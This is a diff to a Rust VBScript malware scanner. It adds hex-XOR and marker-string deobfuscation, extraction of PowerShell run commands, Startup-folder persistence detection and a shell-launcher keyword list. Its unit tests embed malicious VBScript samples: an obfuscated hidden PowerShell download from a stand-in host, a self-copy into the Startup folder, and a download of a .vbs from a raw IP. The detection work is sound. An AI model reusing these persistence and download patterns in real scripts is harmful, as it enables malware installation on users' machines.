@@ -54,6 +54,20 @@ static RESPONSE_REDIRECT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\bResponse\.Redirect\s*\(?\s*"([^"]+)""#).expect("response redirect")
 });
 
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static VBS_HEX_XOR_WRAPPER_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\).*?\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*Crypt\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*False\s*\)"#,
+    )
+    .expect("vbs hex xor wrapper")
+});
+
+#[derive(Debug, Clone)]
+struct VbsHexXorWrapper {
+    name: String,
+    key: String,
+}
+
 pub fn scan_vbs_payloads(env: &mut Environment) {
     extract_vbs_execute_inners(env);
 
@@ -66,6 +80,13 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
         let uncommented = strip_vbs_apostrophe_comments(&raw);
         let text = join_vbs_line_continuations(&uncommented);
         let bindings = collect_vbs_string_bindings(&text);
+        let hex_xor_wrappers = collect_vbs_hex_xor_wrappers(&text, &bindings);
+        let lossy_bindings = collect_vbs_lossy_string_bindings(&text, &bindings);
+        let mut shell_bindings = lossy_bindings.clone();
+        shell_bindings.extend(collect_vbs_marker_stripped_shell_bindings(
+            &text,
+            &lossy_bindings,
+        ));
         let process_env = collect_vbs_process_env_bindings(&text, &bindings);
         let dst_hint: Option<String> = extract_savetofile_dest_exprs(&text)
             .into_iter()
@@ -139,10 +160,36 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
         }
 
         for payload in extract_shell_run_ps_scriptblocks(&text, &bindings, &process_env) {
-            let bytes = payload.into_bytes();
-            if !env.all_extracted_ps1.contains(&bytes) {
-                env.all_extracted_ps1.push(bytes);
+            env.push_extracted_ps1(payload.into_bytes());
+        }
+
+        for payload in extract_shell_run_powershell_commands(&text, &shell_bindings) {
+            env.push_extracted_ps1(payload.into_bytes());
+        }
+
+        for (key, value_name, command) in extract_vbs_startup_folder_persistence(&text, &bindings) {
+            if env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence {
+                        hive,
+                        key: existing_key,
+                        value_name: existing_value_name,
+                        command: existing_command,
+                    } if hive == "StartupFolder"
+                        && existing_key.eq_ignore_ascii_case(&key)
+                        && existing_value_name.eq_ignore_ascii_case(&value_name)
+                        && existing_command.eq_ignore_ascii_case(&command)
+                )
+            }) {
+                continue;
             }
+            env.traits.push(Trait::Persistence {
+                hive: "StartupFolder".to_string(),
+                key,
+                value_name,
+                command,
+            });
         }
 
         for url in extract_shell_execute_command_downloads(&text, &bindings) {
@@ -163,6 +210,7 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
 
         for expr in extract_xmlhttp_open_url_exprs(&text) {
             let Some(url) = eval_vbs_string_expr(expr, &bindings)
+                .or_else(|| eval_vbs_hex_xor_wrapper_call(expr, &bindings, &hex_xor_wrappers))
                 .and_then(|value| normalize_vbs_download_url(&value))
             else {
                 continue;
@@ -234,6 +282,88 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
             });
         }
     }
+}
+
+fn collect_vbs_hex_xor_wrappers(
+    text: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Vec<VbsHexXorWrapper> {
+    let mut wrappers = Vec::new();
+    for caps in VBS_HEX_XOR_WRAPPER_RE.captures_iter(text) {
+        let Some(function_name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(function_arg) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(assign_name) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(crypt_arg) = caps.get(4).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(key_name) = caps.get(5).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !assign_name.eq_ignore_ascii_case(function_name)
+            || !crypt_arg.eq_ignore_ascii_case(function_arg)
+        {
+            continue;
+        }
+        let Some(key) = bindings.get(&key_name.to_ascii_lowercase()) else {
+            continue;
+        };
+        if key.is_empty() || key.len() > 256 {
+            continue;
+        }
+        wrappers.push(VbsHexXorWrapper {
+            name: function_name.to_ascii_lowercase(),
+            key: key.clone(),
+        });
+    }
+    wrappers
+}
+
+fn eval_vbs_hex_xor_wrapper_call(
+    expr: &str,
+    bindings: &std::collections::HashMap<String, String>,
+    wrappers: &[VbsHexXorWrapper],
+) -> Option<String> {
+    let expr = expr.trim();
+    let open = expr.find('(')?;
+    let close = expr.rfind(')')?;
+    if close <= open {
+        return None;
+    }
+    let name = expr[..open].trim().to_ascii_lowercase();
+    let wrapper = wrappers.iter().find(|wrapper| wrapper.name == name)?;
+    let args = split_vbs_args(&expr[open + 1..close]);
+    let arg = args.first()?.trim();
+    let hex = eval_vbs_string_expr(arg, bindings)
+        .or_else(|| bindings.get(&arg.to_ascii_lowercase()).cloned())?;
+    decode_vbs_hex_xor(&hex, &wrapper.key)
+}
+
+fn decode_vbs_hex_xor(hex: &str, key: &str) -> Option<String> {
+    let hex = hex.trim();
+    if hex.is_empty()
+        || hex.len() % 2 != 0
+        || hex.len() > 128 * 1024
+        || !hex.bytes().all(|byte| byte.is_ascii_hexdigit())
+    {
+        return None;
+    }
+    let key = key.as_bytes();
+    if key.is_empty() {
+        return None;
+    }
+    let mut out = String::with_capacity(hex.len() / 2);
+    for (idx, pair) in hex.as_bytes().chunks_exact(2).enumerate() {
+        let text = std::str::from_utf8(pair).ok()?;
+        let byte = u8::from_str_radix(text, 16).ok()?;
+        out.push((byte ^ key[idx % key.len()]) as char);
+    }
+    Some(out)
 }
 
 fn collect_vbs_process_env_bindings(
@@ -424,6 +554,75 @@ fn extract_shell_run_ps_scriptblocks(
     payloads
 }
 
+fn extract_shell_run_powershell_commands(
+    text: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Vec<String> {
+    if !crate::util::contains_ascii_case_insensitive(text, ".run")
+        && !crate::util::contains_ascii_case_insensitive(text, ".exec")
+    {
+        return Vec::new();
+    }
+
+    let mut payloads = Vec::new();
+    for line in text.lines() {
+        for method in [".run", ".exec"] {
+            let mut cursor = 0usize;
+            while let Some(pos) = find_ascii_case_insensitive_from(line, method, cursor) {
+                let mut args = line[pos + method.len()..].trim();
+                if let Some(stripped) = args.strip_prefix('(') {
+                    args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
+                }
+                let Some(first_arg) = split_vbs_args(args).first().copied() else {
+                    cursor = pos + method.len();
+                    continue;
+                };
+                let Some(command) = eval_vbs_string_expr_lossy(first_arg, bindings) else {
+                    cursor = pos + method.len();
+                    continue;
+                };
+                if let Some(payload) = powershell_command_payload(&command) {
+                    payloads.push(payload);
+                }
+                cursor = pos + method.len();
+            }
+        }
+    }
+    payloads
+}
+
+fn powershell_command_payload(command: &str) -> Option<String> {
+    let ps_pos = find_ascii_case_insensitive_from(command, "powershell", 0)?;
+    let tail = &command[ps_pos..];
+    let command_pos = find_ascii_case_insensitive_from(tail, "-command", 0)
+        .or_else(|| find_ascii_case_insensitive_from(tail, "-c", 0))?;
+    let flag = if tail[command_pos..]
+        .get(.."-command".len())
+        .is_some_and(|s| s.eq_ignore_ascii_case("-command"))
+    {
+        "-command"
+    } else {
+        "-c"
+    };
+    let payload = tail[command_pos + flag.len()..].trim();
+    if contains_vbs_concat_residue(payload) {
+        return None;
+    }
+    let payload = payload.trim_matches(['"', '\'']);
+    if contains_vbs_concat_residue(payload) {
+        return None;
+    }
+    (!payload.is_empty()).then(|| payload.to_string())
+}
+
+fn contains_vbs_concat_residue(payload: &str) -> bool {
+    payload.starts_with('&')
+        || payload.contains("\" &")
+        || payload.contains("& \"")
+        || payload.contains("' &")
+        || payload.contains("& '")
+}
+
 fn scriptblock_env_payload(
     command: &str,
     process_env: &std::collections::HashMap<String, String>,
@@ -538,6 +737,65 @@ fn extract_shell_run_command_downloads(
         }
     }
     urls
+}
+
+fn extract_vbs_startup_folder_persistence(
+    text: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Vec<(String, String, String)> {
+    if !crate::util::contains_ascii_case_insensitive(text, ".SpecialFolders")
+        || !crate::util::contains_ascii_case_insensitive(text, "Startup")
+        || !crate::util::contains_ascii_case_insensitive(text, ".CopyFile")
+    {
+        return Vec::new();
+    }
+
+    let lossy_bindings = collect_vbs_lossy_string_bindings(text, bindings);
+    let mut out = Vec::new();
+    for line in text.lines() {
+        let mut cursor = 0usize;
+        while let Some(pos) = find_ascii_case_insensitive_from(line, ".CopyFile", cursor) {
+            let mut args = line[pos + ".CopyFile".len()..].trim();
+            if let Some(stripped) = args.strip_prefix('(') {
+                args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
+            }
+            let parts = split_vbs_args(args);
+            let Some(dst_expr) = parts.get(1).copied() else {
+                cursor = pos + ".CopyFile".len();
+                continue;
+            };
+            let Some(dst) = eval_vbs_string_expr_lossy(dst_expr, &lossy_bindings) else {
+                cursor = pos + ".CopyFile".len();
+                continue;
+            };
+            if !crate::util::contains_ascii_case_insensitive(&dst, "%Startup%")
+                && !crate::util::contains_ascii_case_insensitive(&dst, "\\Startup\\")
+                && !crate::util::contains_ascii_case_insensitive(&dst, "/Startup/")
+            {
+                cursor = pos + ".CopyFile".len();
+                continue;
+            }
+            let Some(value_name) = vbs_windows_basename(&dst) else {
+                cursor = pos + ".CopyFile".len();
+                continue;
+            };
+            let key = dst
+                .rsplit_once(['\\', '/'])
+                .map(|(dir, _)| dir.to_string())
+                .unwrap_or_else(|| "%Startup%".to_string());
+            out.push((key, value_name.to_string(), dst));
+            cursor = pos + ".CopyFile".len();
+        }
+    }
+    out
+}
+
+fn vbs_windows_basename(path: &str) -> Option<&str> {
+    let trimmed = path.trim().trim_matches(['"', '\'']);
+    trimmed
+        .rsplit(['\\', '/'])
+        .find(|part| !part.trim().is_empty())
+        .map(str::trim)
 }
 
 fn extract_shell_execute_command_downloads(
@@ -810,7 +1068,6 @@ fn extract_vbs_execute_inners(env: &mut Environment) {
     let mut queue = env.all_extracted_vbs.clone();
     let mut execute_count = 0usize;
     let mut expanded_bytes = 0usize;
-    let mut added: Vec<Vec<u8>> = Vec::new();
     let mut cursor = 0usize;
 
     while cursor < queue.len()
@@ -840,17 +1097,14 @@ fn extract_vbs_execute_inners(env: &mut Environment) {
             }
             execute_count += 1;
             let bytes = decoded.as_bytes().to_vec();
-            if seen_payloads.insert(bytes.clone()) {
+            if seen_payloads.insert(bytes.clone()) && env.push_extracted_vbs(bytes.clone()) {
                 queue.push(bytes.clone());
-                added.push(bytes);
             }
             if execute_count >= MAX_EXECUTE_COUNT {
                 break;
             }
         }
     }
-
-    env.all_extracted_vbs.extend(added);
 }
 
 fn collect_vbs_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
@@ -871,6 +1125,110 @@ fn collect_vbs_string_bindings(text: &str) -> std::collections::HashMap<String, 
         }
     }
     bindings
+}
+
+fn collect_vbs_lossy_string_bindings(
+    text: &str,
+    exact_bindings: &std::collections::HashMap<String, String>,
+) -> std::collections::HashMap<String, String> {
+    let mut bindings = exact_bindings.clone();
+    for line in text.lines() {
+        for statement in split_vbs_statements(line) {
+            collect_vbs_special_folder_binding(statement, &mut bindings);
+            let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
+                continue;
+            };
+            let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
+                continue;
+            };
+            let Some(value) =
+                eval_vbs_assignment_value_lossy(name.as_str(), value.as_str(), &bindings)
+            else {
+                continue;
+            };
+            bindings.insert(name.as_str().to_ascii_lowercase(), value);
+        }
+    }
+    bindings
+}
+
+fn collect_vbs_marker_stripped_shell_bindings(
+    text: &str,
+    initial_bindings: &std::collections::HashMap<String, String>,
+) -> std::collections::HashMap<String, String> {
+    let mut bindings = initial_bindings.clone();
+    let mut out = std::collections::HashMap::new();
+    for line in text.lines() {
+        for statement in split_vbs_statements(line) {
+            let Some((name, value)) =
+                eval_vbs_marker_stripped_self_assignment(statement, &bindings)
+            else {
+                continue;
+            };
+            bindings.insert(name.clone(), value.clone());
+            if value_looks_like_shell_command(&value) {
+                out.insert(name, value);
+            }
+        }
+    }
+    out
+}
+
+fn eval_vbs_marker_stripped_self_assignment(
+    statement: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<(String, String)> {
+    let caps = VBS_STRING_ASSIGN_RE.captures(statement)?;
+    let name = caps.get(1)?.as_str();
+    let rhs = caps.get(2)?.as_str().trim();
+    let open = rhs.find('(')?;
+    let function_name = rhs[..open].trim();
+    if !is_vbs_identifier(function_name) {
+        return None;
+    }
+    let inner = rhs[open + 1..].trim().strip_suffix(')')?;
+    let args = split_vbs_args(inner);
+    if args.len() < 3 || !args[0].trim().eq_ignore_ascii_case(name) {
+        return None;
+    }
+    let source = bindings.get(&name.to_ascii_lowercase())?;
+    let marker = eval_vbs_string_expr_lossy(args[1], bindings)?;
+    let replacement = eval_vbs_string_expr_lossy(args[2], bindings)?;
+    if marker.is_empty() || marker.len() > 256 || replacement.len() > 256 {
+        return None;
+    }
+    let cleaned = source.replace(&marker, &replacement);
+    if cleaned == *source || !value_looks_like_shell_command(&cleaned) {
+        return None;
+    }
+    Some((name.to_ascii_lowercase(), cleaned))
+}
+
+fn value_looks_like_shell_command(value: &str) -> bool {
+    crate::util::contains_ascii_case_insensitive(value, "powershell")
+        || crate::util::contains_ascii_case_insensitive(value, "cmd.exe")
+        || crate::util::contains_ascii_case_insensitive(value, "wscript")
+        || crate::util::contains_ascii_case_insensitive(value, "cscript")
+        || crate::util::contains_ascii_case_insensitive(value, "mshta")
+}
+
+fn collect_vbs_special_folder_binding(
+    statement: &str,
+    bindings: &mut std::collections::HashMap<String, String>,
+) {
+    let Some((lhs, rhs)) = statement.split_once('=') else {
+        return;
+    };
+    if !crate::util::contains_ascii_case_insensitive(rhs, ".SpecialFolders")
+        || !crate::util::contains_ascii_case_insensitive(rhs, "Startup")
+    {
+        return;
+    }
+    let name = lhs.trim();
+    if !is_vbs_identifier(name) {
+        return;
+    }
+    bindings.insert(name.to_ascii_lowercase(), "%Startup%".to_string());
 }
 
 fn eval_vbs_assignment_value(
@@ -897,6 +1255,32 @@ fn eval_vbs_assignment_value(
         saw_appended = true;
     }
     saw_appended.then_some(out)
+}
+
+fn eval_vbs_assignment_value_lossy(
+    name: &str,
+    expr: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    if let Some(value) = eval_vbs_string_expr(expr, bindings) {
+        return Some(value);
+    }
+
+    let key = name.to_ascii_lowercase();
+    let parts = split_vbs_concat(expr);
+    let first = parts.first()?.trim().trim_matches(['(', ')']);
+    if first.eq_ignore_ascii_case(name) {
+        let mut out = bindings.get(&key).cloned().unwrap_or_default();
+        let mut saw_appended = false;
+        for part in parts.into_iter().skip(1) {
+            let value = eval_vbs_string_expr_lossy(part, bindings)?;
+            out.push_str(&value);
+            saw_appended = true;
+        }
+        return saw_appended.then_some(out);
+    }
+
+    eval_vbs_string_expr_lossy(expr, bindings)
 }
 
 fn vbs_execute_expr(line: &str) -> Option<&str> {
@@ -1071,6 +1455,54 @@ fn eval_vbs_string_expr(
         return None;
     }
     saw_part.then_some(out)
+}
+
+fn eval_vbs_string_expr_lossy(
+    expr: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let mut out = String::new();
+    let mut saw_part = false;
+    for part in split_vbs_concat(expr) {
+        let part = part.trim();
+        if part.is_empty() {
+            continue;
+        }
+        if let Some(value) = eval_vbs_string_expr(part, bindings) {
+            out.push_str(&value);
+            saw_part = true;
+            continue;
+        }
+        let key = part.trim_matches(['(', ')']).to_ascii_lowercase();
+        if is_vbs_identifier(&key) {
+            out.push_str("%VBSVAR:");
+            out.push_str(&key);
+            out.push('%');
+            saw_part = true;
+            continue;
+        }
+        if crate::util::contains_ascii_case_insensitive(part, "WScript.ScriptName") {
+            out.push_str("%WScript.ScriptName%");
+            saw_part = true;
+            continue;
+        }
+        if crate::util::contains_ascii_case_insensitive(part, "CurrentDirectory") {
+            out.push_str("%CurrentDirectory%");
+            saw_part = true;
+            continue;
+        }
+        return None;
+    }
+    saw_part.then_some(out)
+}
+
+fn is_vbs_identifier(value: &str) -> bool {
+    let mut chars = value.chars();
+    let Some(first) = chars.next() else {
+        return false;
+    };
+    (first.is_ascii_alphabetic() || first == '_')
+        && chars.all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
 }
 
 fn split_vbs_concat(expr: &str) -> Vec<&str> {
@@ -1335,6 +1767,9 @@ fn parse_vbs_replace(
     let source = eval_vbs_string_expr(args[0], bindings)?;
     let find = eval_vbs_string_expr(args[1], bindings)?;
     let replacement = eval_vbs_string_expr(args[2], bindings)?;
+    if find.is_empty() {
+        return Some(source);
+    }
     if args
         .get(5)
         .is_some_and(|compare| vbs_replace_text_compare(compare))
@@ -1450,9 +1885,12 @@ fn reverse_vbs_string(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::{
-        collect_vbs_string_bindings, command_download_urls, parse_vbs_string_transform,
-        reverse_vbs_string,
+        collect_vbs_string_bindings, command_download_urls, parse_vbs_replace,
+        parse_vbs_string_transform, powershell_command_payload, reverse_vbs_string,
+        scan_vbs_payloads,
     };
+    use crate::env::{Config, Environment};
+    use crate::traits::Trait;
 
     #[test]
     fn parse_vbs_string_transform_matches_mixed_case_left_and_right() {
@@ -1488,6 +1926,97 @@ mod tests {
                 "cmd /c powershell Invoke-WebRequest -Uri ttp://45.88.67.75/pdf/a.pdf%Temp%\\google.vbs",
             ),
             vec!["http://45.88.67.75/pdf/a.pdf".to_string()]
+        );
+    }
+
+    #[test]
+    fn replace_with_empty_needle_is_not_expanded() {
+        let bindings = std::collections::HashMap::new();
+        assert_eq!(
+            parse_vbs_replace(r#"Replace("abc", "", "X")"#, &bindings),
+            Some("abc".to_string())
+        );
+    }
+
+    #[test]
+    fn powershell_run_payload_rejects_unresolved_vbs_concat_tail() {
+        assert_eq!(
+            powershell_command_payload(r#"powershell -command " & hipercloridria"#),
+            None
+        );
+    }
+
+    #[test]
+    fn shell_run_marker_stripped_powershell_is_extracted() {
+        let vbs = r#"
+Function stripm(ByVal source, ByVal marker, ByVal replacement)
+    stripm = Replace(source, marker, replacement)
+End Function
+marker = "@@"
+cmd = "pow@@ershell -command "
+script = "$url = 'https://vbs-marker.example/payload'; Invoke-WebRequest -Uri $url"
+cmd = cmd & script
+cmd = stripm(cmd, marker, "")
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False
+"#;
+        let mut env = Environment::new(&Config::default());
+        env.push_extracted_vbs(vbs.as_bytes().to_vec());
+        scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.all_extracted_ps1.iter().any(|payload| {
+                let text = String::from_utf8_lossy(payload);
+                text.contains("Invoke-WebRequest -Uri $url") && !text.contains("@@")
+            }),
+            "marker-stripped PowerShell payload was not queued: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
+    fn shell_run_copyfile_startup_persistence_and_powershell_are_extracted() {
+        let vbs = r#"
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+originador = "recoleta.vbs"
+estrefura = WshShell.CurrentDirectory & "\" & WScript.ScriptName
+enloisar = WshShell.SpecialFolders("Startup")
+mortulho = enloisar & "\" & originador
+fso.CopyFile estrefura, mortulho
+agasalhado = "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & originador
+hipercloridria = "[System.IO.File]::Copy('" & estrefura & "', 'C:\Users\' + [Environment]::UserName + '" & agasalhado & "')"
+decathlo = "cmd.exe /c ping 127.0.0.1 -n 10 & powershell -command " & hipercloridria
+WshShell.Run decathlo, 0, true
+"#;
+        let mut env = Environment::new(&Config::default());
+        env.push_extracted_vbs(vbs.as_bytes().to_vec());
+        scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "StartupFolder"
+                    && key == "%Startup%"
+                    && value_name == "recoleta.vbs"
+                    && command == "%Startup%\\recoleta.vbs"
+            )),
+            "Startup CopyFile persistence was not extracted: {:?}",
+            env.traits
+        );
+        assert!(
+            env.all_extracted_ps1.iter().any(|payload| {
+                let text = String::from_utf8_lossy(payload);
+                text.contains("[System.IO.File]::Copy")
+                    && text.contains(r"Programs\Startup\recoleta.vbs")
+            }),
+            "WshShell.Run PowerShell payload was not queued: {:?}",
+            env.all_extracted_ps1
         );
     }
 }
